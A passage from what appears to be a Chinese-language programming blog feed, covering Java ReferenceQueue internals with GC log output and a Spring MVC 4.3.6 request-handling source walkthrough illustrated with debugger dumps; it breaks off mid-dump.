<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(Reference&lt;? extends T&gt; r)</span> </span>&#123; <span class="comment">/* Called only by Reference class */</span></span><br><span class="line">       <span class="keyword">synchronized</span> (lock) &#123; <span class="comment">// 和队列相关的锁</span></span><br><span class="line">           <span class="comment">// Check that since getting the lock this reference hasn't already been</span></span><br><span class="line">           <span class="comment">// enqueued (and even then removed)</span></span><br><span class="line">           <span class="comment">// 校验下r带的队列是自己, 并且已经enqueue的不会重复enqueue</span></span><br><span class="line">           ReferenceQueue&lt;?&gt; queue = r.queue;</span><br><span class="line">           <span class="keyword">if</span> ((queue == NULL) || (queue == ENQUEUED)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">assert</span> queue == <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 修改Reference的queue为ENQUEUED, 代表已经入队了</span></span><br><span class="line">           r.queue = ENQUEUED;</span><br><span class="line">           <span class="comment">// 链表的头插发, 将当前的引用入队, 并更新head的值和队列的长度</span></span><br><span class="line">           r.next = (head == <span class="keyword">null</span>) ? r : head;</span><br><span class="line">           head = r;</span><br><span class="line">           queueLength++;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           lock.notifyAll();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>出队列相关的操作:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">   <span class="keyword">private</span> Reference&lt;? extends T&gt; reallyPoll() &#123;       <span class="comment">/* Must hold lock */</span></span><br><span class="line">       Reference&lt;? extends T&gt; r = head;</span><br><span class="line">       <span class="keyword">if</span> (r != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="comment">// 因为这个队列的尾节点的next总是指向自己, 这里判断如果是尾节点出队列, head置为null</span></span><br><span class="line">           head = (r.next == r) ?</span><br><span class="line">               <span class="keyword">null</span> :</span><br><span class="line">               r.next; <span class="comment">// Unchecked due to the next field having a raw type in Reference</span></span><br><span class="line">           <span class="comment">// 修改对应queue的状态, 代表已经出队列</span></span><br><span class="line">           r.queue = NULL;</span><br><span class="line">           <span class="comment">// 对于出队列的引用, 他的next也是指向自己的</span></span><br><span class="line">           r.next = r;</span><br><span class="line">           queueLength--;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(-<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h2 id="openjdk"><a href="#openjdk" class="headerlink" title="openjdk"></a>openjdk</h2><blockquote>
<p>上面两个变量对应在VM中的调用，可以参考openjdk中的hotspot源码，在hotspot/src/share/vm/memory/referenceProcessor.cpp 的ReferenceProcessor::discover_reference 方法。(根据此方法的注释由了解到虚拟机在对Reference的处理有ReferenceBasedDiscovery和RefeferentBasedDiscovery两种策略)</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReferenceProcessor::enqueue_discovered_reflist</span><span class="params">(DiscoveredList&amp; refs_list,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                    HeapWord* pending_list_addr)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Given a list of refs linked through the "discovered" field</span></span><br><span class="line">  <span class="comment">// (java.lang.ref.Reference.discovered), self-loop their "next" field</span></span><br><span class="line">  <span class="comment">// thus distinguishing them from active References, then</span></span><br><span class="line">  <span class="comment">// prepend them to the pending list.</span></span><br><span class="line">  <span class="comment">// BKWRD COMPATIBILITY <span class="doctag">NOTE:</span> For older JDKs (prior to the fix for 4956777),</span></span><br><span class="line">  <span class="comment">// the "next" field is used to chain the pending list, not the discovered</span></span><br><span class="line">  <span class="comment">// field.</span></span><br><span class="line">  ...</span><br><span class="line">                                                    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="GC日志"><a href="#GC日志" class="headerlink" title="GC日志"></a>GC日志</h2><p>在jvm的启动参数中加入下面的flag, 可以打开处理引用用掉的时间:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+PrintGCDetails -XX:+PrintReferenceGC</span><br></pre></td></tr></table></figure>
<p>测试代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testGc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Object reference = <span class="keyword">new</span> Object();</span><br><span class="line">       <span class="keyword">final</span> WeakReference&lt;Object&gt; weakReference = <span class="keyword">new</span> WeakReference&lt;&gt;(reference);</span><br><span class="line"></span><br><span class="line">       Assert.assertEquals(reference, weakReference.get());</span><br><span class="line"></span><br><span class="line">       reference = <span class="keyword">null</span>;</span><br><span class="line">       System.gc();</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 当所引用的对象在 JVM 内不再有强引用时, GC 后 weak reference 将会被自动回收</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       Assert.assertNull(weakReference.get());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>日志输出:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[GC (System.gc()) [SoftReference, 0 refs, 0.0000616 secs][WeakReference, 34 refs, 0.0000273 secs][FinalReference, 654 refs, 0.0003785 secs][PhantomReference, 0 refs, 0 refs, 0.0000060 secs][JNI Weak Reference, 0.0000023 secs][PSYoungGen: 10708K-&gt;1566K(56320K)] 10708K-&gt;1574K(184832K), 0.0083391 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] </span><br><span class="line">[Full GC (System.gc()) [SoftReference, 0 refs, 0.0000153 secs][WeakReference, 1 refs, 0.0000035 secs][FinalReference, 85 refs, 0.0000111 secs][PhantomReference, 0 refs, 0 refs, 0.0000037 secs][JNI Weak Reference, 0.0000020 secs][PSYoungGen: 1566K-&gt;0K(56320K)] [ParOldGen: 8K-&gt;1438K(128512K)] 1574K-&gt;1438K(184832K), [Metaspace: 4770K-&gt;4770K(1056768K)], 0.0319906 secs] [Times: user=0.03 sys=0.00, real=0.04 secs] </span><br><span class="line">Heap</span><br><span class="line"> PSYoungGen      total 56320K, used 972K [0x0000000781e00000, 0x0000000785c80000, 0x00000007c0000000)</span><br><span class="line">  eden space 48640K, 2% used [0x0000000781e00000,0x0000000781ef3358,0x0000000784d80000)</span><br><span class="line">  from space 7680K, 0% used [0x0000000784d80000,0x0000000784d80000,0x0000000785500000)</span><br><span class="line">  to   space 7680K, 0% used [0x0000000785500000,0x0000000785500000,0x0000000785c80000)</span><br><span class="line"> ParOldGen       total 128512K, used 1438K [0x0000000705a00000, 0x000000070d780000, 0x0000000781e00000)</span><br><span class="line">  object space 128512K, 1% used [0x0000000705a00000,0x0000000705b679e0,0x000000070d780000)</span><br><span class="line"> Metaspace       used 4784K, capacity 5158K, committed 5248K, reserved 1056768K</span><br><span class="line">  class space    used 564K, capacity 593K, committed 640K, reserved 1048576K</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://hongjiang.info/java-referencequeue/#comment-4504" rel="external nofollow noopener noreferrer" target="_blank">话说ReferenceQueue | 写点什么</a></li>
<li><a href="https://cordate.github.io/2018/03/06/java/SharedSecrets%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/" rel="external nofollow noopener noreferrer" target="_blank">SharedSecrets深入理解 | 柳絮纷飞</a></li>
<li><a href="http://www.iteye.com/topic/401478" rel="external nofollow noopener noreferrer" target="_blank">理解 Java 的 GC 与 幽灵引用 - Java - ITeye论坛</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> reference </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring Mvc源码剖析(二)]]></title>
      <url>http://qsli.github.io/2018/05/06/spring-mvc-2/</url>
      <content type="html"><![CDATA[<p>启动流程的分析见: <a href="/2016/10/02/spring-mvc/" title="Spring Mvc源码剖析(一)">Spring Mvc源码剖析(一)</a></p>
<img src="/2018/05/06/spring-mvc-2/spring-mvc.png">
<h2 id="源码版本"><a href="#源码版本" class="headerlink" title="源码版本"></a>源码版本</h2><blockquote>
<p>4.3.6.RELEASE</p>
</blockquote>
<h2 id="HandlerExecutionChain"><a href="#HandlerExecutionChain" class="headerlink" title="HandlerExecutionChain"></a>HandlerExecutionChain</h2><p><em>request -&gt; executionchain</em></p>
<p>// RequestMappingHandlerMapping<br>遍历已有的<code>HandlerMapping</code>, 找到第一个能处理的<code>HandlerMapping</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerExecutionChain <span class="title">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (HandlerMapping hm : <span class="keyword">this</span>.handlerMappings) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">				logger.trace(</span><br><span class="line">						<span class="string">"Testing handler map ["</span> + hm + <span class="string">"] in DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			HandlerExecutionChain handler = hm.getHandler(request);</span><br><span class="line">			<span class="keyword">if</span> (handler != <span class="keyword">null</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> handler;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>handlerMappings的值默认是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">this.handlerMappings = &#123;ArrayList@5980&#125;  size = 2</span><br><span class="line"> 0 = &#123;RequestMappingHandlerMapping@5997&#125; </span><br><span class="line"> 1 = &#123;BeanNameUrlHandlerMapping@6002&#125;</span><br></pre></td></tr></table></figure>
<p>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</p>
<p>executionchain就是interceptor和实际处理方法的结合体</p>
<h3 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h3><p><em>url -&gt; HandlerMethod</em></p>
<p>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal</p>
<p><code>HandlerMethod</code>是具体的controller对应的方法.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mappingLookup = &#123;LinkedHashMap@6069&#125;  size = 4</span><br><span class="line"> 0 = &#123;LinkedHashMap$Entry@6077&#125; &quot;&#123;[/async]&#125;&quot; -&gt; &quot;public java.util.concurrent.Callable&lt;java.lang.String&gt; com.air.mvc.AsyncController.asyncProcess()&quot;</span><br><span class="line"> 1 = &#123;LinkedHashMap$Entry@6078&#125; &quot;&#123;[/asyncV2]&#125;&quot; -&gt; &quot;public org.springframework.web.context.request.async.DeferredResult&lt;java.lang.String&gt; com.air.mvc.AsyncController.aysncProcess2()&quot;</span><br><span class="line"> 2 = &#123;LinkedHashMap$Entry@6079&#125; &quot;&#123;[/mvc/echo]&#125;&quot; -&gt; &quot;private java.lang.String com.air.mvc.SampleController.echo(javax.servlet.http.HttpServletRequest)&quot;</span><br><span class="line"> 3 = &#123;LinkedHashMap$Entry@6080&#125; &quot;&#123;[/mvc/test]&#125;&quot; -&gt; &quot;private java.lang.String com.air.mvc.SampleController.echo(java.lang.String)&quot;</span><br></pre></td></tr></table></figure>
<h3 id="interceptor"><a href="#interceptor" class="headerlink" title="interceptor"></a>interceptor</h3><p><em>url -&gt; interceptors</em></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /mvc/test</span></span><br><span class="line">String lookupPath = <span class="keyword">this</span>.urlPathHelper.getLookupPathForRequest(request);</span><br><span class="line">		<span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="keyword">this</span>.adaptedInterceptors) &#123;</span><br><span class="line">			<span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line">				MappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;</span><br><span class="line">				<span class="keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="keyword">this</span>.pathMatcher)) &#123;</span><br><span class="line">					chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				chain.addInterceptor(interceptor);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<h2 id="HandlerAdapter"><a href="#HandlerAdapter" class="headerlink" title="HandlerAdapter"></a>HandlerAdapter</h2><p><em>HandlerMethod -&gt; HandlerAdapter</em></p>
<p>// RequestMappingHandlerAdapter<br>org.springframework.web.servlet.DispatcherServlet#getHandlerAdapter</p>
<p>遍历所有的<code>HandlerAdapters</code>, 找到第一个能处理的<code>HandlerAdapter</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerAdapter <span class="title">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (HandlerAdapter ha : <span class="keyword">this</span>.handlerAdapters) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">				logger.trace(<span class="string">"Testing handler adapter ["</span> + ha + <span class="string">"]"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (ha.supports(handler)) &#123;</span><br><span class="line">				<span class="keyword">return</span> ha;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"No adapter for handler ["</span> + handler +</span><br><span class="line">				<span class="string">"]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler"</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>默认的<code>HandlerAdapters</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.handlerAdapters = &#123;ArrayList@5983&#125;  size = 3</span><br><span class="line"> 0 = &#123;RequestMappingHandlerAdapter@4845&#125; </span><br><span class="line"> 1 = &#123;HttpRequestHandlerAdapter@6268&#125; </span><br><span class="line"> 2 = &#123;SimpleControllerHandlerAdapter@6269&#125;</span><br></pre></td></tr></table></figure>
<p>涉及到的请求处理:</p>
<pre><code>a. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod
    调用对应的controller方法

b. org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView
    返回模型和视图
</code></pre><h2 id="ServletInvocableHandlerMethod"><a href="#ServletInvocableHandlerMethod" class="headerlink" title="ServletInvocableHandlerMethod"></a>ServletInvocableHandlerMethod</h2><p><em>HandlerMethod -&gt; ServletInvocableHandlerMethod</em></p>
<p>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</p>
<p>   a. InvocableHandlerMethod#invokeForRequest</p>
<pre><code>    1. 解析传递的参数, 必要时进行转换(resolver负责映射输入的参数名称和controller方法对应的参数, dataBinder负责类型转换和校验)
    2. 反射调用对应的方法

b. returnValueHandlers#handleReturnValue
    从所有的handler中找到第一个支持对应返回值类型的处理返回值, 可能涉及`HttpMessageConverter`
</code></pre><h3 id="argumentResolvers"><a href="#argumentResolvers" class="headerlink" title="argumentResolvers"></a>argumentResolvers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">this.argumentResolvers = &#123;HandlerMethodArgumentResolverComposite@4853&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6533&#125; </span><br><span class="line"> argumentResolvers = &#123;LinkedList@6534&#125;  size = 26</span><br><span class="line">  0 = &#123;RequestParamMethodArgumentResolver@5292&#125; </span><br><span class="line">  1 = &#123;RequestParamMapMethodArgumentResolver@6541&#125; </span><br><span class="line">  2 = &#123;PathVariableMethodArgumentResolver@6542&#125; </span><br><span class="line">  3 = &#123;PathVariableMapMethodArgumentResolver@6543&#125; </span><br><span class="line">  4 = &#123;MatrixVariableMethodArgumentResolver@6544&#125; </span><br><span class="line">  5 = &#123;MatrixVariableMapMethodArgumentResolver@6545&#125; </span><br><span class="line">  6 = &#123;ServletModelAttributeMethodProcessor@6546&#125; </span><br><span class="line">  7 = &#123;RequestResponseBodyMethodProcessor@6547&#125; </span><br><span class="line">  8 = &#123;RequestPartMethodArgumentResolver@6548&#125; </span><br><span class="line">  9 = &#123;RequestHeaderMethodArgumentResolver@6549&#125; </span><br><span class="line">  10 = &#123;RequestHeaderMapMethodArgumentResolver@6550&#125; </span><br><span class="line">  11 = &#123;ServletCookieValueMethodArgumentResolver@6551&#125; </span><br><span class="line">  12 = &#123;ExpressionValueMethodArgumentResolver@6552&#125; </span><br><span class="line">  13 = &#123;SessionAttributeMethodArgumentResolver@6553&#125; </span><br><span class="line">  14 = &#123;RequestAttributeMethodArgumentResolver@6554&#125; </span><br><span class="line">  15 = &#123;ServletRequestMethodArgumentResolver@6555&#125; </span><br><span class="line">  16 = &#123;ServletResponseMethodArgumentResolver@6556&#125; </span><br><span class="line">  17 = &#123;HttpEntityMethodProcessor@6557&#125; </span><br><span class="line">  18 = &#123;RedirectAttributesMethodArgumentResolver@6558&#125; </span><br><span class="line">  19 = &#123;ModelMethodProcessor@6559&#125; </span><br><span class="line">  20 = &#123;MapMethodProcessor@6560&#125; </span><br><span class="line">  21 = &#123;ErrorsMethodArgumentResolver@6561&#125; </span><br><span class="line">  22 = &#123;SessionStatusMethodArgumentResolver@6562&#125; </span><br><span class="line">  23 = &#123;UriComponentsBuilderMethodArgumentResolver@6563&#125; </span><br><span class="line">  24 = &#123;RequestParamMethodArgumentResolver@6564&#125; </span><br><span class="line">  25 = &#123;ServletModelAttributeMethodProcessor@6565&#125; </span><br><span class="line"> argumentResolverCache = &#123;ConcurrentHashMap@6535&#125;  size = 1</span><br><span class="line">  0 = &#123;ConcurrentHashMap$MapEntry@6538&#125; &quot;method &apos;echo&apos; parameter 0&quot; -&gt; </span><br><span class="line">   key = &#123;HandlerMethod$HandlerMethodParameter@5293&#125; &quot;method &apos;echo&apos; parameter 0&quot;</span><br><span class="line">   value = &#123;RequestParamMethodArgumentResolver@5292&#125;</span><br></pre></td></tr></table></figure>
<h3 id="returnValueHandlers"><a href="#returnValueHandlers" class="headerlink" title="returnValueHandlers"></a>returnValueHandlers</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">this.returnValueHandlers = &#123;HandlerMethodReturnValueHandlerComposite@4855&#125; </span><br><span class="line"> logger = &#123;SLF4JLocationAwareLog@6567&#125; </span><br><span class="line"> returnValueHandlers = &#123;ArrayList@6568&#125;  size = 15</span><br><span class="line">  0 = &#123;ModelAndViewMethodReturnValueHandler@6570&#125; </span><br><span class="line">  1 = &#123;ModelMethodProcessor@6571&#125; </span><br><span class="line">  2 = &#123;ViewMethodReturnValueHandler@6572&#125; </span><br><span class="line">  3 = &#123;ResponseBodyEmitterReturnValueHandler@6573&#125; </span><br><span class="line">  4 = &#123;StreamingResponseBodyReturnValueHandler@6574&#125; </span><br><span class="line">  5 = &#123;HttpEntityMethodProcessor@6575&#125; </span><br><span class="line">  6 = &#123;HttpHeadersReturnValueHandler@6576&#125; </span><br><span class="line">  7 = &#123;CallableMethodReturnValueHandler@6577&#125; </span><br><span class="line">  8 = &#123;DeferredResultMethodReturnValueHandler@6578&#125; </span><br><span class="line">  9 = &#123;AsyncTaskMethodReturnValueHandler@6579&#125; </span><br><span class="line">  10 = &#123;ModelAttributeMethodProcessor@6580&#125; </span><br><span class="line">  11 = &#123;RequestResponseBodyMethodProcessor@6581&#125; </span><br><span class="line">  12 = &#123;ViewNameMethodReturnValueHandler@6582&#125; </span><br><span class="line">  13 = &#123;MapMethodProcessor@6583&#125; </span><br><span class="line">  14 = &#123;ModelAttributeMethodProcessor@6584&#125;</span><br></pre></td></tr></table></figure>
<h3 id="binderFactory"><a href="#binderFactory" class="headerlink" title="binderFactory"></a>binderFactory</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">binderFactory = &#123;ServletRequestDataBinderFactory@6498&#125; </span><br><span class="line"> binderMethods = &#123;ArrayList@6585&#125;  size = 0</span><br><span class="line"> initializer = &#123;ConfigurableWebBindingInitializer@4859&#125; </span><br><span class="line">  autoGrowNestedPaths = true</span><br><span class="line">  directFieldAccess = false</span><br><span class="line">  messageCodesResolver = null</span><br><span class="line">  bindingErrorProcessor = null</span><br><span class="line">  validator = null</span><br><span class="line">  conversionService = &#123;DefaultFormattingConversionService@6586&#125; &quot;ConversionService converters =\n\t@org.springframework.format.annotation.DateTimeFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.datetime.DateTimeFormatAnnotationFormatterFactory@6e62d1c,@org.springframework.format.annotation.NumberFormat java.lang.Long -&gt; java.lang.String: org.springframework.format.number.NumberFormatAnnotationFormatterFactory@44f758c9\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDate -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDate -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccessorPrinter@4ec42ea0\n\t@org.springframework.format.annotation.DateTimeFormat java.time.LocalDateTime -&gt; java.lang.String: org.springframework.format.datetime.standard.Jsr310DateTimeFormatAnnotationFormatterFactory@30fbf8e3,java.time.LocalDateTime -&gt; java.lang.String : org.springframework.format.datetime.standard.TemporalAccess&quot;</span><br><span class="line">   embeddedValueResolver = &#123;EmbeddedValueResolver@6003&#125; </span><br><span class="line">   cachedPrinters = 